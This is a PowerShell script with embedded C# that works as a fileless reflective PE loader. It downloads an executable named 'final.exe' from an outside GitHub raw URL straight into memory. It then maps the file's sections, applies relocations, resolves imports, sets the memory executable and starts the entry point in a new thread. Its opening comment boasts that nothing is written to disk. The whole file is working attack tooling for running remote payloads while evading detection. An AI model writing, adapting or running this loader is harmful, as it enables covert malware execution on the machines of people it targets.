# absolute fileless — bytes only in RAM, no disk write
$ErrorActionPreference = 'Stop'
$url = 'https://raw.githubusercontent.com/anab1os/ShellHost/main/final.exe'
$peBytes = (New-Object Net.WebClient).DownloadData($url)

$cs = @'
using System;
using System.Runtime.InteropServices;

public class MemRun {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr r, IntPtr p, uint f, out uint id);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string n);

    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40, PAGE_READWRITE = 0x04;

    public static void Run(byte[] pe) {
        int e_lfanew = BitConverter.ToInt32(pe, 0x3C);
        ushort numSections = BitConverter.ToUInt16(pe, e_lfanew + 6);
        ushort sizeOpt = BitConverter.ToUInt16(pe, e_lfanew + 20);
        int opt = e_lfanew + 24;
        if (BitConverter.ToUInt16(pe, opt) != 0x20B) throw new Exception("need x64 PE");

        ulong preferred = BitConverter.ToUInt64(pe, opt + 24);
        uint sizeOfImage = BitConverter.ToUInt32(pe, opt + 56);
        uint sizeOfHeaders = BitConverter.ToUInt32(pe, opt + 60);
        uint entryRVA = BitConverter.ToUInt32(pe, opt + 16);

        IntPtr bas = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (bas == IntPtr.Zero) throw new Exception("alloc");

        Marshal.Copy(pe, 0, bas, (int)sizeOfHeaders);

        int sect = opt + sizeOpt;
        for (int i = 0; i < numSections; i++) {
            int off = sect + i * 40;
            uint va = BitConverter.ToUInt32(pe, off + 12);
            uint rs = BitConverter.ToUInt32(pe, off + 16);
            uint rp = BitConverter.ToUInt32(pe, off + 20);
            if (rs == 0 || rp == 0) continue;
            byte[] tmp = new byte[rs];
            int copy = (int)Math.Min(rs, pe.Length - rp);
            if (copy <= 0) continue;
            Buffer.BlockCopy(pe, (int)rp, tmp, 0, copy);
            Marshal.Copy(tmp, 0, IntPtr.Add(bas, (int)va), copy);
        }

        ulong delta = (ulong)bas.ToInt64() - preferred;
        if (delta != 0) {
            uint relocRVA = BitConverter.ToUInt32(pe, opt + 152);
            uint relocSize = BitConverter.ToUInt32(pe, opt + 156);
            if (relocRVA != 0 && relocSize != 0) {
                int pos = (int)relocRVA;
                int end = (int)(relocRVA + relocSize);
                while (pos < end) {
                    uint pageRVA = (uint)Marshal.ReadInt32(IntPtr.Add(bas, pos));
                    uint blockSize = (uint)Marshal.ReadInt32(IntPtr.Add(bas, pos + 4));
                    if (blockSize < 8) break;
                    int cnt = (int)((blockSize - 8) / 2);
                    for (int j = 0; j < cnt; j++) {
                        ushort e = (ushort)Marshal.ReadInt16(IntPtr.Add(bas, pos + 8 + j * 2));
                        int type = e >> 12;
                        int ro = e & 0xFFF;
                        if (type == 10) {
                            IntPtr p = IntPtr.Add(bas, (int)pageRVA + ro);
                            Marshal.WriteInt64(p, Marshal.ReadInt64(p) + (long)delta);
                        }
                    }
                    pos += (int)blockSize;
                }
            }
        }

        uint importRVA = BitConverter.ToUInt32(pe, opt + 120);
        if (importRVA != 0) {
            int desc = (int)importRVA;
            while (true) {
                uint nameRVA = (uint)Marshal.ReadInt32(IntPtr.Add(bas, desc + 12));
                if (nameRVA == 0) break;
                uint oft = (uint)Marshal.ReadInt32(IntPtr.Add(bas, desc));
                uint ft  = (uint)Marshal.ReadInt32(IntPtr.Add(bas, desc + 16));
                string dll = Marshal.PtrToStringAnsi(IntPtr.Add(bas, (int)nameRVA));
                IntPtr hMod = LoadLibrary(dll);
                if (hMod == IntPtr.Zero) hMod = GetModuleHandle(dll);
                uint thunk = oft != 0 ? oft : ft;
                int t = 0;
                while (true) {
                    long tv = Marshal.ReadInt64(IntPtr.Add(bas, (int)thunk + t));
                    if (tv == 0) break;
                    IntPtr fn;
                    if ((tv & unchecked((long)0x8000000000000000L)) != 0)
                        fn = GetProcAddress(hMod, "#" + (tv & 0xFFFF));
                    else
                        fn = GetProcAddress(hMod, Marshal.PtrToStringAnsi(IntPtr.Add(bas, (int)tv + 2)));
                    Marshal.WriteInt64(IntPtr.Add(bas, (int)ft + t), fn.ToInt64());
                    t += 8;
                }
                desc += 20;
            }
        }

        uint oldProt;
        VirtualProtect(bas, sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProt);

        IntPtr entry = IntPtr.Add(bas, (int)entryRVA);
        uint tid;
        CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, out tid);
        // fire-and-forget — radar loop runs in new thread, PS can exit
        System.Threading.Thread.Sleep(500);
    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp
[MemRun]::Run($peBytes)
